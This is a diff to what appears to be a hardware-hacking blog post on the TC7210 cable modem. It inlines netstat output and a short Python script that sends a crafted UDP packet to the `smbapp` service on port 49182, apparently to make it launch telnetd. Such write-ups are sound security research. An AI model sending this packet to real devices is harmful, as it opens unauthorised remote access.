@@ -95,7 +95,29 @@ The TC7210 has two operative systems (OS), the eCos real-time OS, and a Linux ba
 
 For that to happen, the eCos OS needs to be able to communicate with the Linux OS. As discussed in the previous article, the `smbapp` is the application responsible for managing the NAS functionality. A good indicator of how the application is receiving commands from the eCos OS is the fact that it listens on port `49182` (UDP).
 
-{{< gist serializingme 2be71fadd346db82e6ba4ea4ed54fb3c "netstat.sh" >}}
+```shell {linenos=inline}
+#!/bin/bash
+netstat -nlp
+# Active Internet connections (only servers)
+# Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+# tcp        0      0 192.168.178.10:4321     0.0.0.0:*               LISTEN      556/bcmmserver
+# tcp        0      0 192.168.178.10:2468     0.0.0.0:*               LISTEN      556/bcmmserver
+# tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      2601/smbd
+# tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      316/portmap
+# tcp        0      0 192.168.178.10:80       0.0.0.0:*               LISTEN      556/bcmmserver
+# tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      2601/smbd
+# tcp        0      0 :::23                   :::*                    LISTEN      2596/telnetd
+# udp        0      0 192.168.178.10:137      0.0.0.0:*                           2649/nmbd
+# udp        0      0 0.0.0.0:137             0.0.0.0:*                           2649/nmbd
+# udp        0      0 192.168.178.10:138      0.0.0.0:*                           2649/nmbd
+# udp        0      0 0.0.0.0:138             0.0.0.0:*                           2649/nmbd
+# udp        0      0 0.0.0.0:49181           0.0.0.0:*                           386/mscapp
+# udp        0      0 0.0.0.0:49182           0.0.0.0:*                           328/smbapp
+# udp        0      0 0.0.0.0:1900            0.0.0.0:*                           556/bcmmserver
+# udp        0      0 0.0.0.0:111             0.0.0.0:*                           316/portmap
+# Active UNIX domain sockets (only servers)
+# Proto RefCnt Flags       Type       State         I-Node PID/Program name    Path
+```
 
 By revisiting the string analysis performed previously it was possible to find other interesting strings in the `smbapp` application that indicated some sort of functionality to manage a Telnet server. The strings are: `smbapp: Launching telnetd.` and `smbapp: Killing telnetd`. It is possible to confirm this by loading `smbapp` in a disassembler and searching for references to those strings.
 
@@ -117,7 +139,22 @@ From the flow of execution depicted above, we can see that the first word of the
 
 With this information, the next step was to hack up a script that would send the right bytes to the listening socket of the `smbapp`.
 
-{{< gist serializingme 2be71fadd346db82e6ba4ea4ed54fb3c "exploit.py" >}}
+```python {linenos=inline}
+import socket
+
+ADDRESS = '<IP address of the NAS>'
+PORT = 49182
+PACKET = bytes([
+    0x01, 0x07, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x01
+])
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+sock.sendto(PACKET, (ADDRESS, PORT))
+
+line, server = sock.recvfrom(128)
+
+print(line)
+```
 
 {{< alert >}}The script needs to be executed with Python 3.{{< /alert >}}
 
